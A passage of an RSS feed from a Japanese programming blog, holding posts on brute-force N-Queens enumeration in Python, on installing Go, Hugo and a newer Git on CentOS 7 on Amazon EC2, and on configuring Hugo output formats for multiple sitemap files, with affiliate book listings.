類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>第1回 pythonでNQueen（エイトクイーン）ブルートフォース　力任せ探索（１）</title><link>https://suzukiiichiro.github.io/posts/2022-01-27-01-ani/</link><pubDate>Thu, 27 Jan 2022 15:55:55 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-27-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-27-01-ani/chess.jpg" alt="Featured image of post 第1回 pythonでNQueen（エイトクイーン）ブルートフォース　力任せ探索（１）" />&lt;h2 id="nクイーン問題とは">Nクイーン問題とは&lt;/h2>
&lt;p>Nクイーン問題とは、チェスの盤面にクイーンを１行に１個ずつ効き筋に当たらないように置いていこうという問題です。&lt;/p>
&lt;p>&lt;a class="link" href="https://ja.wikipedia.org/wiki/%E3%82%A8%E3%82%A4%E3%83%88%E3%83%BB%E3%82%AF%E3%82%A4%E3%83%BC%E3%83%B3" target="_blank" rel="noopener"
>https://ja.wikipedia.org/wiki/%E3%82%A8%E3%82%A4%E3%83%88%E3%83%BB%E3%82%AF%E3%82%A4%E3%83%BC%E3%83%B3&lt;/a>&lt;/p>
&lt;p>NクイーンのNは盤面の行・列の数です８クイーンだと８x８です。&lt;br>
おける場所の数を算出する法則はないのでプログラムを組んでクイーンを配置していくしかないのですが、&lt;br>
Nの数が増えれば置ける場所の候補が爆発的に増えていきプログラムでも何年経っても終わらないようなものになります。&lt;br>
現在最大のNは２７クイーンです。&lt;/p>
&lt;p>Nクイーンを早く解く方法はいくつかあって、&lt;br>
①アルゴリズムを使って探索を効率化する&lt;br>
②ビット計算で計算速度を上げる&lt;br>
③GPUなどを使って並列計算をする&lt;br>
などがあります。&lt;/p>
&lt;h2 id="pythonで頑張る">Pythonで頑張る&lt;/h2>
&lt;p>Python は最近すっかりメジャーになり、プログラミング教育が小学校で必修化され最初に学ぶのがPythonだという話もあります。&lt;br>
ライブラリも非常に充実しています。&lt;br>
そこで勉強を兼ねてPythonを使ってNクイーン問題を解いていこうと思います。&lt;/p>
&lt;h2 id="アルゴリズムなしでnクイーン問題を解こうとすると">アルゴリズムなしでNクイーン問題を解こうとすると。。。&lt;/h2>
&lt;p>Nクイーンはアルゴリズムを使うとどのくらい早くなるのでしょうか。&lt;br>
それを体感するために今回はまったくアルゴリズムを使わないでプログラムにNクイーン問題に取り組ませてみましょう。&lt;br>
まったくアルゴリズムを使わない方法は「ブルートフォース　力任せ探索」と呼ばれるものです。&lt;/p>
&lt;p>N4だと4の4乗で256パターン&lt;br>
私のPCだと0m0.042sで終了しますが&lt;br>
N8だと8の8乗で16777216パターン&lt;br>
3m7.321sもかかってしまいます。&lt;/p>
&lt;p>ちなみに今後やる検索効率化アルゴリズム「バックトラック」だと&lt;br>
N8でと0m0.03sで完了します（もっと早いアルゴリズムも出てきます。）。&lt;/p>
&lt;p>ここでは触って動かしてみていただいて時間かかるなあと思っていただければ良いです。&lt;/p>
&lt;h2 id="プログラムについて">プログラムについて&lt;/h2>
&lt;p>プログラムは以下のgitにあります。&lt;br>
&lt;a class="link" href="https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py01_nqueen.py" target="_blank" rel="noopener"
>https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py01_nqueen.py&lt;/a>&lt;/p>
&lt;p>このプログラムは鈴木維一郎先生が作成したものです。&lt;br>
私はこのプログラムを初めてみながらpythonだとこう書くんだと思いながら&lt;br>
pythonの勉強させてもらいながらコメントしていく感じになります。&lt;/p>
&lt;p>プログラムのダウンロード方法は以下です。&lt;/p>
&lt;p>git clone &lt;a class="link" href="https://github.com/suzukiiichiro/N-Queens/" target="_blank" rel="noopener"
>https://github.com/suzukiiichiro/N-Queens/&lt;/a>&lt;/p>
&lt;p>実行方法は&lt;br>
N-Queens/03Pythonに移動して&lt;br>
python py01_nqueen.py&lt;/p>
&lt;p>です。&lt;/p>
&lt;h2 id="プログラム概要">プログラム概要&lt;/h2>
&lt;p>このプログラムでやりたいことはエイトクイーン(N=8)の時に全ての可能性のある解の候補を体系的に数え上げます。&lt;br>
利き筋などは全く考えず1行に1個ずつクイーンを置いていきます。&lt;br>
パターン数はNxNになるのでエイトクイーン(N=8)だと8の8乗16777216パターンクイーンを配置します。&lt;/p>
&lt;p>プログラムがやるのはここまでです。これが正解かどうかはプログラムではチェックしません。&lt;br>
プログラムが列挙したパターンから人力でどれが正解かをチェックしようと思ったらエイトクイーン(N=8)でも相当の年月がかかりますね。&lt;/p>
&lt;p>出力はパターンのカウント数と各行にクイーンが置かれた場所になります。&lt;/p>
&lt;pre tabindex="0">&lt;code>1: 00000000
2: 00000001
3: 00000002
4: 00000003
.
.
.
163100: 00476433
163101: 00476434
163102: 00476435
163103: 00476436
.
.
.
16777213: 77777774
16777214: 77777775
16777215: 77777776
16777216: 77777777
&lt;/code>&lt;/pre>&lt;p>例えば&lt;br>
163101: 00476434&lt;br>
だと&lt;/p>
&lt;p>163101はカウント数です。163101番目のパターンという意味です。&lt;/p>
&lt;p>00476434はクイーンが置かれた場所です&lt;br>
左端が1行目で左から右へ行数が増えていきます。&lt;br>
クイーンの位置が&lt;br>
0:1行目は0なので右から1番目&lt;br>
0:2行目は0なので右から1番目&lt;br>
4:3行目は4なので右から5番目&lt;br>
7:4行目は7なので右から8番目&lt;br>
6:5行目は6なので右から7番目&lt;br>
4:6行目は4なので右から5番目&lt;br>
3:7行目は3なので右から4番目&lt;br>
4:8行目は4なので右から5番目&lt;br>
に置かれたということを表現しています。&lt;/p>
&lt;p>図にすると以下になります&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 241px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-27-01-ani/q1.png" data-size="353x351">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-27-01-ani/q1.png"
width="353"
height="351"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>この例だと2行目に1行目と同じ列にクイーンを配置しているので、2行目の段階で1行目の下の効き筋に引っかかっているので解にはなりません。&lt;/p>
&lt;p>次回はプログラム詳細について説明していきたいと思います。&lt;/p></description></item><item><title>Amazon EC2でもGo言語とHugoを使えるようにする方法</title><link>https://suzukiiichiro.github.io/posts/2022-01-27-01-wyoshi/</link><pubDate>Thu, 27 Jan 2022 13:31:52 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-27-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-27-01-wyoshi/catch.jpg" alt="Featured image of post Amazon EC2でもGo言語とHugoを使えるようにする方法" />&lt;p>HugoをGitHub Pagesで展開していたのですが、今回はGitHub Pagesではなく、Amazon EC2にHugoをインストールしてみたいと思います。&lt;/p>
&lt;h2 id="go言語をcentos7にインストール">GO言語をCentOS7にインストール&lt;/h2>
&lt;p>Hugoを利用するためにGo言語をインストールするのですが、yumでインストールすると様々ななエラーが出る場合があるので、今回はtarファイルを解凍して配置します。&lt;/p>
&lt;p>brewがすでにインストールされている場合はbrewでのインストールが早いです。&lt;/p>
&lt;h3 id="go言語をインストール">GO言語をインストール&lt;/h3>
&lt;p>まずは、GO言語のファイルをダウンロードして、解凍、インストールする場所に配置してやりましょう。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ wget https://golang.org/dl/go1.16.linux-amd64.tar.gz
$ sudo tar zxf go1.16.linux-amd64.tar.gz -C /usr/local/
$ export PATH=$PATH:/usr/local/go/bin
&lt;/code>&lt;/pre>&lt;p>インストールされたGoのバージョンを確認します&lt;/p>
&lt;pre tabindex="0">&lt;code>$ go version
&lt;/code>&lt;/pre>&lt;p>インストールが成功していれば、下記のようなバージョンが表示されます。&lt;/p>
&lt;pre tabindex="0">&lt;code>go version go1.15.14 linux/amd64
&lt;/code>&lt;/pre>&lt;p>GOROOTも確認しておきます&lt;/p>
&lt;pre tabindex="0">&lt;code>$ go env|grep GOROOT
GOROOT=&amp;quot;/usr/local/go&amp;quot;
&lt;/code>&lt;/pre>&lt;p>Hugoをインストールする上で、GOPATHが必要なので設定しましょう。&lt;br>
GOPATHとGOROOTが同じ場所にならないようにすることに注意してください。&lt;br>
同じ場所に設定してしまうと、&lt;/p>
&lt;pre tabindex="0">&lt;code>warning: GOPATH set to GOROOT (/usr/local/go) has no effect
&lt;/code>&lt;/pre>&lt;p>といったワーニングが表示されてしまいます。&lt;br>
なので、GOPATHとGOROOTを別にしてやりましょう。&lt;/p>
&lt;p>それではGOPATHを設定していきます。&lt;/p>
&lt;pre tabindex="0">&lt;code>vi ~/.bash_profile
&lt;/code>&lt;/pre>&lt;p>上記のコマンドで、.bash_profileをひらいて、下記のコマンドを追加します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-:~/.bash_profile" data-lang=":~/.bash_profile">&lt;span class="nb">export&lt;/span> &lt;span class="nv">GOPATH&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$HOME&lt;/span>/go
&lt;span class="nb">export&lt;/span> &lt;span class="nv">PATH&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$GOPATH&lt;/span>/bin:&lt;span class="nv">$PATH&lt;/span>:&lt;span class="nv">$HOME&lt;/span>/bin
&lt;/code>&lt;/pre>&lt;/div>&lt;p>設定を反映させて、確認します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ source ~/.bash_profile
$ echo $GOPATH
/home/[user]/go
$ echo $PATH
/home/[user]/go/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/bin:/root/bin:/root/bin
&lt;/code>&lt;/pre>&lt;p>無事追加できました。&lt;br>
以上がGo言語の設定になります。&lt;/p>
&lt;h2 id="hugoをcentos7にインストール">HugoをCentOS7にインストール&lt;/h2>
&lt;p>それでは、いよいよHugoをインストールしましょう。&lt;br>
GitHubからHugoを取得します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">mkdir &lt;span class="nv">$HOME&lt;/span>/src
&lt;span class="nb">cd&lt;/span> &lt;span class="nv">$HOME&lt;/span>/src
git clone https://github.com/gohugoio/hugo.git
&lt;span class="nb">cd&lt;/span> hugo
go install --tags extended
&lt;/code>&lt;/pre>&lt;/div>&lt;p>インストールできたら hugo してみましょう&lt;/p>
&lt;h2 id="gitinfoを使っているとエラーになる場合がある">GitInfoを使っているとエラーになる場合がある&lt;/h2>
&lt;p>Gitのバージョンが古いと、&lt;code>hugo&lt;/code>した際に、情報を取得できないくてエラーになってしまうようです。&lt;/p>
&lt;pre tabindex="0">&lt;code>hugo v0.93.0-DEV+extended linux/amd64 BuildDate=unknown
ERROR 2022/01/27 Failed to read Git log: Unknown option: -C
usage: git [--version] [--help] [-c name=value]
[--exec-path[=&amp;lt;path&amp;gt;]] [--html-path] [--man-path] [--info-path]
[-p|--paginate|--no-pager] [--no-replace-objects] [--bare]
[--git-dir=&amp;lt;path&amp;gt;] [--work-tree=&amp;lt;path&amp;gt;] [--namespace=&amp;lt;name&amp;gt;]
&amp;lt;command&amp;gt; [&amp;lt;args&amp;gt;]
&lt;/code>&lt;/pre>&lt;p>私の環境ではGitのバージョンが&lt;code>git version 1.8.3.1&lt;/code> となっていたため、これをアップデートして正しく動作するようにします。&lt;/p>
&lt;p>まずはすでにインストールされているGitを削除します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ sudo yum -y remove git
&lt;/code>&lt;/pre>&lt;p>次に、2系の配布がされているiusリポジトリを追加します。&lt;br>
私の環境はCentOS7だったので下記のコマンドでyumからインストールします。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ sudo yum -y install https://repo.ius.io/ius-release-el7.rpm
&lt;/code>&lt;/pre>&lt;p>iusはサードパーティのリポジトリのため、常に有効にならないように設定ファイルを確認しておきます。&lt;code>enabled = 0&lt;/code> となっていたら、常に有効にならない設定です。&lt;/p>
&lt;pre tabindex="0">&lt;code>[ius-debuginfo]
name = IUS for Enterprise Linux 7 - $basearch - Debug
baseurl = https://repo.ius.io/7/$basearch/debug/
enabled = 0
repo_gpgcheck = 0
gpgcheck = 1
gpgkey = file:///etc/pki/rpm-gpg/RPM-GPG-KEY-IUS-7
[ius-source]
name = IUS for Enterprise Linux 7 - Source
baseurl = https://repo.ius.io/7/src/
enabled = 0
repo_gpgcheck = 0
gpgcheck = 1
gpgkey = file:///etc/pki/rpm-gpg/RPM-GPG-KEY-IUS-7
&lt;/code>&lt;/pre>&lt;p>それでは。インストール可能なGitを調べます。&lt;br>
yumでiusを使うときは、yumコマンドの際に、&lt;code>--enablerepo=ius&lt;/code>オプションをつけます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ sudo yum list --enablerepo=ius | grep git2
…
git224.x86_64 2.24.4-1.el7.ius ius
…
&lt;/code>&lt;/pre>&lt;p>インストール可能なGitがあったので、インストールをします。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ sudo yum -y install --enablerepo=ius git224
&lt;/code>&lt;/pre>&lt;p>インストールが無事完了したことを確認しましょう&lt;/p>
&lt;pre tabindex="0">&lt;code>$ git --version
git version 2.24.3
&lt;/code>&lt;/pre>&lt;p>バージョンが表示されていたら、正常にインストールが完了してます。&lt;br>
これで GitInfo 使ったhugoのサーバでも&lt;code>hugo&lt;/code>コマンドが実行できるようになりました。&lt;/p>
&lt;h2 id="おすすめの書籍">おすすめの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e6%94%b9%e8%a8%822%e7%89%88-%e3%82%8f%e3%81%8b%e3%81%b0%e3%81%a1%e3%82%83%e3%82%93%e3%81%a8%e5%ad%a6%e3%81%b6-Git%e4%bd%bf%e3%81%84%e6%96%b9%e5%85%a5%e9%96%80%e3%80%88GitHub%e3%80%81SourceTree%e3%80%81%e3%82%b3%e3%83%9e%e3%83%b3%e3%83%89%e6%93%8d%e4%bd%9c%e5%af%be%e5%bf%9c%e3%80%89-%e6%b9%8a%e5%b7%9d-%e3%81%82%e3%81%84/dp/4863543433/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51ITQMzMG2L.jpg" alt=" 改訂2版 わかばちゃんと学ぶ Git使い方入門〈GitHub、SourceTree、コマンド操作対応〉 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> 改訂2版 わかばちゃんと学ぶ Git使い方入門〈GitHub、SourceTree、コマンド操作対応〉 &lt;/h2>
&lt;p> マンガと実践で学ぶGitの入門書が最新情報に対応して改訂しました! Gitの概念はもちろん、GitHubについても丁寧に解説しています。これからGitを使い始める人にオススメの1冊です。 本書ではクリック操作でGitを使えるSourceTreeを中心に解説しているので、初心者でも安心です。 せっかく学ぶなら、やっぱり楽しい方がいい 「Gitって難しそう」 「勉強しようとは思っているけど、なかなか一歩が踏み出せない」 そんな方のために、楽しくGitを理解できる本を作りました。 ・個性的なキャラクターたちが登場するマンガ ・感覚的にわかる図解 ・丁寧な実践パート 上記3つの特長で、Gitを無理なく学べます。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/Markdown%e3%83%a9%e3%82%a4%e3%83%86%e3%82%a3%e3%83%b3%e3%82%b0%e5%85%a5%e9%96%80-%e3%83%97%e3%83%ac%e3%83%bc%e3%83%b3%e3%83%86%e3%82%ad%e3%82%b9%e3%83%88%e3%81%a7%e6%b0%97%e6%a5%bd%e3%81%ab%e6%9b%b8%e3%81%93%e3%81%86%ef%bc%81-%e6%8a%80%e8%a1%93%e3%81%ae%e6%b3%89%e3%82%b7%e3%83%aa%e3%83%bc%e3%82%ba%ef%bc%88NextPublishing%ef%bc%89-%e8%97%a4%e5%8e%9f-%e6%83%9f/dp/4844398369/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/514KHlwilvL.jpg" alt=" Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) &lt;/h2>
&lt;p> 【プレーンテキストでらくらくライティング! Markdownを使いこなそう! 】 本書は、文章を書く=ライティングを「気楽に」行うための道具としての「Markdown」形式を紹介し、その使い方を詳しく解説しています。Wordなどのワープロソフトに限定されることなく、テキストエディタやMarkdown専用エディタ、ポメラなどの文書入力専用機、さらにはスマートホン上でも「見出し」や「強調」といった文章執筆に必要な情報を共有するための書式であるMarkdownの書き方やその定義や起源を、初心者でもわかりやすく紹介しています。 〈本書の対象読者〉 執筆のストレスを減らして集中したい人 PCが古くて軽いアプリで執筆したい人 いろいろなアプリで原稿を使いまわしたい人 思いついた時にスマホでメモ書きして原稿にまとめたい人 続きを読む 。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>HUGOでxmlやjsonファイルを複数出力する方法を詳しく解説</title><link>https://suzukiiichiro.github.io/posts/2022-01-26-01-wyoshi/</link><pubDate>Wed, 26 Jan 2022 14:37:51 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-26-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-26-01-wyoshi/catch.jpg" alt="Featured image of post HUGOでxmlやjsonファイルを複数出力する方法を詳しく解説" />&lt;p>HUGOは非常に強力な静的HTMLジェネレーターです。&lt;br>
複数のXMLを設置する機会があり、どうやったら設置できるのかなと悪戦苦闘しながら実装できましたので、そのやり方を共有します。&lt;/p>
&lt;p>今回は sitemap.xml を複数設置する必要があったため、その方法になります。&lt;br>
この方法の出力やファイル形式を変えることで、RSSやJSON、AMPなどの形式も出力できるようになると思います。&lt;/p>
&lt;h2 id="config-に設定を追加する">config に設定を追加する&lt;/h2>
&lt;p>まずは &lt;code>config.yaml&lt;/code> に出力用の設定をします。&lt;br>
設定の内容は下記のようになります。&lt;/p>
&lt;p>私は yaml 形式の設定ファイルを使っているのですが、toml や json 形式の設定ファイルを使っている方は、&lt;a class="link" href="https://gohugo.io/templates/output-formats/" target="_blank" rel="noopener"
> HUGO のページ&lt;/a>を見ながらそれぞれにあった記述にしてください。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">mediaTypes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">application/xml&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">suffixes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">xml&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">outputFormats&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">Sitemap&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">MediaType&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">application/xml&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">baseName&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;google_sitemap&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">noUgly&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">outputs&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">home&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="l">HTML, Sitemap, RSS]&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上から順に説明します。&lt;/p>
&lt;h2 id="出力ファイルの形式">出力ファイルの形式&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">mediaTypes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">application/xml&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">suffixes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">xml&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ここでは出力したい形式を選択してます。今回は、xmlのタイプを選んでます。&lt;br>
ちなみに、この部分は記述しないでも問題がない部分です。&lt;br>
私の環境では出力した場合に、エラーにならずに正常にファイルが出力されました。&lt;/p>
&lt;p>&lt;code>suffixes&lt;/code>の部分では複数の形式を記述することが可能です。&lt;br>
例えば、rss+xmlの場合は&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">mediaTypes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">application/rss+xml&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">suffixes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">xml&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">rss&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>となります。&lt;/p>
&lt;h2 id="出力ファイルの種類">出力ファイルの種類&lt;/h2>
&lt;p>次に、outputFormats部分ですが、この部分が出力の際に重要になってきます。&lt;br>
今回はサイトマップ形式で出力するので、下記のようにしました。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">outputFormats&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">Sitemap&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">MediaType&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">application/xml&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">baseName&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;google_sitemap&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">noUgly&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上の yaml を説明すると、&lt;br>
Sitemap 形式で MediaTypeはサイトマップを表す&lt;code>application/xml&lt;/code>を使用して、&lt;code>google_sitemap&lt;/code>というファイル名のXMLを出力します。&lt;/p>
&lt;h4 id="出力の形式">出力の形式&lt;/h4>
&lt;p>出力形式のオプションは以下のようになります。&lt;/p>
&lt;div class="tips-area info">
&lt;dl>
&lt;dt>1つのページに多くの出力形式で出力可能&lt;/dt>
&lt;dd>1つのページを好きなだけ多くの出力形式で出力することができ、ファイルシステム上の一意なパスに解決する限り、無限に出力形式を定義することができるのです。&lt;br>表では、AMPとHTMLの比較が最も良い例です。AMPはHTML版を上書きしないようにPathにampという値を持っています。&lt;br>例えば、/index.htmlと/amp/index.htmlの両方を持つことができるようになりました。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="tips-area info">
&lt;dl>
&lt;dt>MediaTypeはは既存のもののみ&lt;/dt>
&lt;dd>MediaTypeは、既に定義されているメディアタイプのTypeと一致する必要があります。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="tips-area info">
&lt;dl>
&lt;dt>再定義可能&lt;/dt>
&lt;dd>新しい出力形式を定義したり、組み込みの出力形式を再定義することができます。&lt;br>例えば、AMPページを別のパスに配置したい場合などです。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>出力フォーマットを追加または変更するには、サイトの設定ファイルのoutputFormatsセクションで、すべてのサイトまたは特定の言語について定義します。&lt;/p>
&lt;div style="line-height: 1.1; word-break: break-word; font-size: 0.8em;">
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>name&lt;/th>
&lt;th>mediaType&lt;/th>
&lt;th>path&lt;/th>
&lt;th>baseName&lt;/th>
&lt;th>rel&lt;/th>
&lt;th>protocol&lt;/th>
&lt;th>isPlainText&lt;/th>
&lt;th>isHTML&lt;/th>
&lt;th>noUgly&lt;/th>
&lt;th>permalinkable&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>HTML&lt;/td>
&lt;td>text/html&lt;/td>
&lt;td>&lt;/td>
&lt;td>index&lt;/td>
&lt;td>canonical&lt;/td>
&lt;td>&lt;/td>
&lt;td>false&lt;/td>
&lt;td>true&lt;/td>
&lt;td>false&lt;/td>
&lt;td>true&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>AMP&lt;/td>
&lt;td>text/html&lt;/td>
&lt;td>amp&lt;/td>
&lt;td>index&lt;/td>
&lt;td>amphtml&lt;/td>
&lt;td>&lt;/td>
&lt;td>false&lt;/td>
&lt;td>true&lt;/td>
&lt;td>false&lt;/td>
&lt;td>true&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>CSS&lt;/td>
&lt;td>text/css&lt;/td>
&lt;td>&lt;/td>
&lt;td>styles&lt;/td>
&lt;td>stylesheet&lt;/td>
&lt;td>&lt;/td>
&lt;td>true&lt;/td>
&lt;td>false&lt;/td>
&lt;td>false&lt;/td>
&lt;td>false&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>CSV&lt;/td>
&lt;td>text/csv&lt;/td>
&lt;td>&lt;/td>
&lt;td>index&lt;/td>
&lt;td>alternate&lt;/td>
&lt;td>&lt;/td>
&lt;td>true&lt;/td>
&lt;td>false&lt;/td>
&lt;td>false&lt;/td>
&lt;td>false&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Calendar&lt;/td>
&lt;td>text/calendar&lt;/td>
&lt;td>&lt;/td>
&lt;td>index&lt;/td>
&lt;td>alternate&lt;/td>
&lt;td>webcal://&lt;/td>
&lt;td>true&lt;/td>
&lt;td>false&lt;/td>
&lt;td>false&lt;/td>
&lt;td>false&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>JSON&lt;/td>
&lt;td>application/json&lt;/td>
&lt;td>&lt;/td>
&lt;td>index&lt;/td>
&lt;td>alternate&lt;/td>
&lt;td>&lt;/td>
&lt;td>true&lt;/td>
&lt;td>false&lt;/td>
&lt;td>false&lt;/td>
&lt;td>false&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ROBOTS&lt;/td>
&lt;td>text/plain&lt;/td>
&lt;td>&lt;/td>
&lt;td>robots&lt;/td>
&lt;td>alternate&lt;/td>
&lt;td>&lt;/td>
&lt;td>true&lt;/td>
&lt;td>false&lt;/td>
&lt;td>false&lt;/td>
&lt;td>false&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>RSS&lt;/td>
&lt;td>application/rss+xml&lt;/td>
&lt;td>&lt;/td>
&lt;td>index&lt;/td>
&lt;td>alternate&lt;/td>
&lt;td>&lt;/td>
